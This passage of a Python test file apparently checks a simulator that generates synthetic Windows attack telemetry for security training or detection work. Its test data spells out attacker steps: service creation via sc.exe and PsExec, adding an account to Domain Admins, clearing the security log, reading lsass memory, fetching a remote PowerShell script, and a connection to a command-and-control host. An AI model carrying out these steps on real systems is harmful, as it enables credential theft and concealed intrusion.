        assert engine.activity_generator.explicit_credentials == []

    def test_service_backed_process_does_not_emit_second_payload_file_create(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name=r"C:\Windows\System32\PSEXESVC.exe",
            command_line="PSEXESVC.exe -accepteula",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="start service",
            explicit_types={"process", "service_installed"},
        )

        assert engine.activity_generator.processes[0]["ensure_file_event"] is False

    def test_service_installed_reuses_sc_create_start_type(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        base_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)

        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="process",
                process_name=r"C:\Windows\System32\sc.exe",
                command_line=(
                    r"sc.exe create DeviceSyncSvc binPath= "
                    r"C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto"
                ),
            ),
            actor=actor,
            system=source,
            time=base_time,
            activity="create service",
            explicit_types={"process", "service_installed"},
        )
        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="service_installed",
                service_name="DeviceSyncSvc",
                service_file_name=r"C:\Windows\System32\DeviceSyncSvc.exe",
                service_account="LocalSystem",
            ),
            actor=actor,
            system=source,
            time=base_time + timedelta(seconds=2),
            activity="service audit",
            explicit_types={"process", "service_installed"},
        )

        assert engine.activity_generator.service_installs[0]["service_start_type"] == "2"

    def test_storyline_effects_wait_for_visible_process_create(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        engine._ensure_account_sid_tracking()
        base_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        visible_process_time = base_time + timedelta(seconds=4)

        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="process",
                process_name=r"C:\Windows\System32\sc.exe",
                command_line=(
                    r"sc.exe create DeviceSyncSvc binPath= "
                    r"C:\Windows\System32\DeviceSyncSvc.exe obj= LocalSystem start= auto"
                ),
            ),
            actor=actor,
            system=source,
            time=base_time,
            activity="create service",
            explicit_types={"process", "service_installed"},
        )
        engine.state_manager.processes[(source.hostname, 4242)] = SimpleNamespace(
            username=actor.username,
            logon_id="0xabc",
            start_time=base_time,
        )
        engine.activity_generator.process_source_times[(source.hostname, 4242)] = (
            visible_process_time
        )
        effect_time = base_time + timedelta(seconds=2)

        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="service_installed",
                service_name="DeviceSyncSvc",
                service_file_name=r"C:\Windows\System32\DeviceSyncSvc.exe",
                service_account="LocalSystem",
            ),
            actor=actor,
            system=source,
            time=effect_time,
            activity="service audit",
            explicit_types={"process", "service_installed"},
        )
        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="group_member_added",
                scope="domain",
                group_name="Domain Admins",
                member_name="svc_mhsync",
            ),
            actor=actor,
            system=source,
            time=effect_time,
            activity="add domain admin",
            explicit_types={"group_member_added"},
        )
        engine._execute_typed_event(
            spec=SimpleNamespace(type="log_cleared"),
            actor=actor,
            system=source,
            time=effect_time,
            activity="clear security log",
            explicit_types={"log_cleared"},
        )
        engine._execute_typed_event(
            spec=SimpleNamespace(
                type="process_access",
                target_process="lsass.exe",
                access_mask="0x1010",
            ),
            actor=actor,
            system=source,
            time=effect_time,
            activity="read lsass",
            explicit_types={"process_access"},
        )

        assert engine.activity_generator.service_installs[0]["time"] > visible_process_time
        assert engine.activity_generator.group_memberships[0]["time"] > visible_process_time
        assert engine.activity_generator.log_clears[0]["time"] > visible_process_time
        assert engine.activity_generator.process_accesses[0]["time"] > visible_process_time

    def test_process_url_network_reuses_storyline_authored_domain_ip(self):
        source = System(
            hostname="DC-01",
            ip="10.10.2.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[]),
            storyline=[
                SimpleNamespace(
                    events=[
                        SimpleNamespace(
                            type="connection",
                            hostname="cdn-assets-update.com",
                            dst_ip="45.33.32.30",
                        )
                    ]
                )
            ],
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="process",
            process_name="powershell.exe",
            command_line=(
                "powershell.exe -NoProfile -Command "
                "\"Invoke-WebRequest -Uri 'https://cdn-assets-update.com/health.ps1'\""
            ),
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="download health script",
            explicit_types={"process"},
        )

        conn = engine.activity_generator.connections[-1]
        assert conn["dst_ip"] == "45.33.32.30"
        assert conn["hostname"] == "cdn-assets-update.com"
        assert conn["preserve_dst_ip"] is True

    def test_connection_ground_truth_uses_generator_effective_destination(self):
        source = System(
            hostname="SRC",
            ip="10.10.0.10",
            os="Windows 10",
            type="workstation",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.activity_generator._last_connection_effective_dst_ip = "23.45.158.140"
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        spec = SimpleNamespace(
            type="connection",
            source_ip=None,
            dst_ip="93.184.216.34",
            dst_port=443,
            service="ssl",
            orig_bytes=None,
            resp_bytes=None,
            method=None,
            uri=None,
            response_body_len=None,
            description=None,
            technique=None,
            user_agent=None,
            status_code=None,
            referrer=None,
            hostname="attacker-validated.example.net",
            conn_state=None,
        )

        event = engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="connect to C2",
            explicit_types={"connection"},
        )

        assert event is not None
        assert event["dst_ip"] == "23.45.158.140"
        assert event["uid"] == "Cscptransfer00001"
        assert engine.activity_generator.connections[0]["dst_ip"] == "93.184.216.34"

    def test_recent_psexesvc_service_runs_follow_on_commands_as_system(self):
        source = System(
            hostname="DC-01",
            ip="10.10.0.10",
            os="Windows Server 2022",
            type="domain_controller",
        )
        actor = User(
            username="alice",
            full_name="Alice Example",
            email="alice@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(systems=[source], service_accounts=[])
        )
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        service_time = datetime(2026, 5, 11, 12, 0, tzinfo=UTC)
        engine._record_storyline_service_install(
            system=source,
            service_name="PSEXESVC",
            service_file_name=r"%SystemRoot%\PSEXESVC.exe",
            service_account="LocalSystem",
            time=service_time,
        )
        spec = SimpleNamespace(
            type="process",
            process_name=r"C:\Windows\System32\cmd.exe",
            command_line="cmd.exe /c whoami /all",
        )

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=service_time.replace(second=2),
            activity="run remote command through psexec service",
            explicit_types={"process"},
        )

        service_proc = engine.activity_generator.processes[0]
        child_proc = engine.activity_generator.processes[1]
        assert service_proc["user"].username == "SYSTEM"
        assert service_proc["process_name"] == r"C:\Windows\PSEXESVC.exe"
        assert service_proc["parent_pid"] == 500
        assert child_proc["user"].username == "SYSTEM"
        assert child_proc["logon_id"] == "0x3e7"
        assert child_proc["parent_pid"] == 4242

    def test_storyline_dhcp_lease_reuses_existing_host_lease_identity(self):
        source = System(
            hostname="ROGUE-LAPTOP",
            ip="10.10.1.99",
            os="Kali Linux",
            type="workstation",
        )
        actor = User(
            username="root",
            full_name="Root",
            email="root@example.com",
        )
        engine = object.__new__(StorylineMixin)
        engine.scenario = SimpleNamespace(environment=SimpleNamespace(systems=[source]))
        engine.state_manager = _FakeStateManager()
        engine.activity_generator = _FakeActivityGenerator()
        engine.dispatcher = SimpleNamespace(visibility_engine=None)
        engine._infra_ips = {"dc": ["10.10.2.10"]}
        engine._dhcp_lease_state = {
            "ROGUE-LAPTOP": {
                "mac": "f0:1f:af:b7:35:b2",
                "lease_time": 7200.0,
                "last_renewal": 1710763200.0,
                "system": source,
            }
        }
        spec = SimpleNamespace(type="dhcp_lease", requested_ip=None, mac_address=None)

        engine._execute_typed_event(
            spec=spec,
            actor=actor,
            system=source,
            time=datetime(2026, 5, 11, 12, 0, tzinfo=UTC),
            activity="renew lease",
            explicit_types={"dhcp_lease"},
        )

        lease = engine.activity_generator.dhcp_leases[0]
        assert lease["mac"] == "f0:1f:af:b7:35:b2"
        assert lease["lease_time"] == 7200.0
        assert lease["msg_types"] == ["REQUEST", "ACK"]
